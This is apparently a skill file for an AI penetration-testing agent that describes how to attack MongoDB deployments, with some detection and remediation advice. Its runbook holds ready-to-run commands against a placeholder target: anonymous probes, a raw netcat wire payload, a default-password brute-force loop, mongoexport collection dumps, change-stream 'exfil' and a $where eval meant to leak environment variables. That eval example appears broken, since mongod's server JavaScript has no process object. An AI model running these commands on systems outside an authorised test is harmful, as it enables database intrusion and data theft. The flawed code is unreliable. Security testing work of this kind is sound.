---
name: mongodb
description: MongoDB — operator injection, authentication off, $where JS eval, replica-set abuse, change-streams
triggers: [mongodb, mongo, mongoose, $where, $expr, $function, replica set, mongo shell, mongoexport, mongorestore]
---

# MongoDB Security

MongoDB has had a notorious "unauth by default" history; defaults are tighter now (auth required since 3.6), but production deployments still cluster around (1) **public-internet-reachable mongod** with no auth, (2) **NoSQL operator injection** (covered in detail in nosql_injection.md), (3) **$where / $function JavaScript eval** server-side, (4) **change-stream exfil** via authenticated low-priv access, and (5) **mongorestore data import** abuse.

## Attack Surface

### Authentication
- `auth = true` in `mongod.conf` — required for production
- Bug: containerised MongoDB deployments often skip auth setup
- Bug: `bindIp = 0.0.0.0` + no `auth = true` = public + unauth
- Connection string `mongodb://localhost:27017` (no creds) = unauthenticated connection

### Connection string in env vars / logs
- `MONGO_URI=mongodb+srv://user:pass@cluster.mongodb.net/db`
- Bug: full URI with creds in env / logs / error messages
- MongoDB Atlas SRV URIs especially common in leaks

### Operator injection (see nosql_injection.md for full coverage)
- `{$ne: null}` auth bypass — the classic
- `$regex` for blind extraction
- `$where` for JS eval (when enabled — disabled by default ≥ 4.0)
- `$expr` + `$function` for aggregation-pipeline eval

### Replica set + sharding
- Internal replica nodes (port 27017 typically) connect over a separate auth tier
- Bug: `keyFile` for cluster auth shared across environments; leak → impersonate cluster member
- Bug: arbiter / hidden secondary nodes accessible without auth

### Change streams
- `db.collection.watch()` streams changes in real-time
- Bug: user with `read` on a collection can watch all changes → real-time exfil

### Backup files
- `mongodump` produces `.bson` + metadata `.json`
- Bug: backup files written to publicly-accessible S3 buckets / NFS shares

### Default ports
- `27017` — mongod (primary)
- `27018` — shard server
- `27019` — config server
- `28017` — old REST interface (≤ 2.6, removed; sometimes lingers in old images)

## Detection Channels

### Anonymous connection probe
```bash
# Direct connection attempt with no auth
mongosh "mongodb://<TARGET>:27017/admin" --eval 'db.runCommand({listDatabases:1})' --quiet
# If returns DB list → no auth required → critical

# Or via netcat banner
nc -zv <TARGET> 27017
nc <TARGET> 27017 <<< $'\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

### Atlas / cloud DB enumeration
```bash
# MongoDB Atlas SRV records
dig +short SRV "_mongodb._tcp.cluster0.<INSTANCE>.mongodb.net"

# Atlas free-tier hostnames pattern: <random>.mongodb.net
```

### Connection-string discovery in code
```bash
# Common storage
curl -s 'https://<TARGET>/.env' | grep -i mongo
curl -s 'https://<TARGET>/config.json' | grep -i mongo

# In source
grep -rE 'mongodb(\+srv)?://[^@/]+:[^@]+@' .
grep -rE 'MONGO_URI|MONGODB_URI|MONGO_URL' . --include='*.env*'
```

## Operational Runbook

### Step 1 — port scan + auth probe
```bash
# Port scan (Strix's naabu)
naabu -host '<TARGET>' -p 27017,27018,27019,28017

# For each open port, try anonymous connect
for port in 27017 27018 27019; do
  mongosh "mongodb://<TARGET>:${port}/admin" --eval 'db.serverStatus()' --quiet 2>&1 | head -3
done
```

### Step 2 — when auth bypassed
```bash
# Enumerate databases
mongosh "mongodb://<TARGET>:27017/admin" --eval 'db.adminCommand({listDatabases:1})'

# Per database: list collections
mongosh "mongodb://<TARGET>:27017/<DB>" --eval 'db.getCollectionNames()'

# Dump a collection
mongoexport --uri "mongodb://<TARGET>:27017/<DB>" --collection users --out users.json
```

### Step 3 — when auth required: try common creds
```bash
COMMON_USERS=( admin root mongo mongodb dbadmin )
COMMON_PASSWORDS=( admin password mongo mongodb root '' admin123 )

for u in "${COMMON_USERS[@]}"; do
  for p in "${COMMON_PASSWORDS[@]}"; do
    mongosh "mongodb://${u}:${p}@<TARGET>:27017/admin?authSource=admin" \
      --eval 'db.runCommand({connectionStatus:1})' --quiet 2>&1 | head -2
  done
done
```

### Step 4 — operator injection on the app's API
See nosql_injection.md skill for the full battery — operator injection is the app-layer bug class.

### Step 5 — $where / $function JS eval
```bash
# When auth + scripting both available
mongosh "mongodb://...:27017/<DB>" --eval '
db.collection.find({$where: function() {
  // Server-side JS — full mongod runtime
  return JSON.stringify(process.env);  // exfil env vars
}}).toArray()
'

# Newer (4.4+): $function in aggregation
db.collection.aggregate([{$match: {$expr: {$function: {body: "function() {...}", args: [], lang: "js"}}}}])
```

`--noscripting` flag on mongod disables this; check the deployment.

### Step 6 — change-stream exfil (when authenticated as low-priv user)
```javascript
// As a user with read on collection 'transactions':
const stream = db.collection('transactions').watch();
stream.forEach(change => console.log(JSON.stringify(change)));
// Real-time exfil of every insert/update/delete; bypasses access logs that only capture reads.
```

### Step 7 — backup-file recovery
```bash
# Common patterns for mongodump output
curl -s 'https://<TARGET>/backups/dump.bson'
curl -s 'https://<TARGET>/static/mongodump.tar.gz'

# In S3 (cross-reference with aws_s3_attack_surface)
aws s3 ls s3://<bucket>/mongodump/  # if public
```

## Specific Vulnerability Classes

### MongoDB Atlas IP allow-list misconfiguration
- Atlas requires allow-listing IPs for cluster access
- Bug: `0.0.0.0/0` in the allow-list → world-reachable
- Bug: dev VPN CIDR added "temporarily" + never removed

### `mongoexport`-as-a-service
- Some apps expose an admin endpoint to download CSV / JSON of collection data
- Bug: endpoint accepts user-supplied collection name → arbitrary-collection dump

### Replica-set keyFile leak
- All replica members share a keyFile for cluster auth
- Leak the keyFile → impersonate a cluster member → join the replica set → read all data

### `gridfs` file leakage
- GridFS stores binary files in MongoDB; chunks are indexed by filename
- Bug: anonymous read on `fs.files` and `fs.chunks` collections → all uploaded files extracted

### Server-side aggregation eval
- `$accumulator`, `$function` (4.4+) — JS execution server-side
- Bug: app passes user-supplied aggregation pipeline → JS eval

## Bypass Techniques

- **MongoDB Wire Protocol native vs SDAM**: some firewalls inspect TLS-wrapped HTTP but not raw TCP. Bug: blocking HTTP-shaped requests but allowing raw mongo wire = direct exposure.
- **Atlas SRV records as discovery**: `_mongodb._tcp.cluster.example.com` → discover hostnames + ports.
- **Authentication source confusion**: `admin` vs collection-specific auth source; some clients default to `admin`, server expects `myDb` — credentials valid but rejected; useful for fingerprinting.

## Validation

1. Anonymous mongo connection succeeds.
2. Connection string with creds leaked + works via Atlas API call.
3. $where JS eval returns server runtime info.
4. Change-stream watching a non-authorised collection succeeds.
5. mongodump bson file accessible via web.

## False Positives

- MongoDB exposed but tight IP allow-list — confirm via probe from a non-allowed source.
- `mongodb+srv` URIs in test config files — confirm scope.
- Authenticated change-stream from a legitimate analytics user — not a finding if the role intends this.
- Default port `27017` reachable but `auth = true` enforced — different severity than unauth.

## Impact

- Mass DB dump from unauth mongo exposure.
- Credential theft from connection-string leaks.
- Real-time data exfil via change streams.
- RCE in app context via $where / $function eval.
- Cross-cluster compromise via replica-set keyFile leak.

## Remediation

1. **`auth = true` always**: tenant-level enforcement via Atlas / Ops Manager.
2. **`bindIp` to private interfaces only**: never `0.0.0.0` in production.
3. **`--noscripting` flag** to disable $where / $function unless explicitly required.
4. **Atlas IP allow-list**: specific CIDRs, never 0.0.0.0/0.
5. **Connection strings from secret-managers**, never in env vars / repos.
6. **TLS for client + replica-set + sharding traffic**.
7. **Audit collection-level permissions**: most users don't need cluster-wide read.

## Pro Tips

1. Open-internet mongo instances are pervasive in 2026 — `naabu -p 27017` against the org's IP range finds them quickly.
2. Atlas SRV records leak cluster names; org-pattern guessing often surfaces clusters not registered in public DNS.
3. The `--quiet` flag on `mongosh` is your friend for scripting probes.
4. `db.adminCommand({listCollections:1})` works at the database level, not just `db.getCollectionNames()` — use both for full enumeration.
5. Operator injection findings flow through the app layer (see nosql_injection.md); direct-port findings need both surfaces audited.

## Summary

MongoDB bugs split between (1) the database itself — auth, port exposure, scripting — and (2) the app layer using it — operator injection. Audit both; the highest impact in 2026 is still public-port + no-auth deployments lingering from older deploy templates.
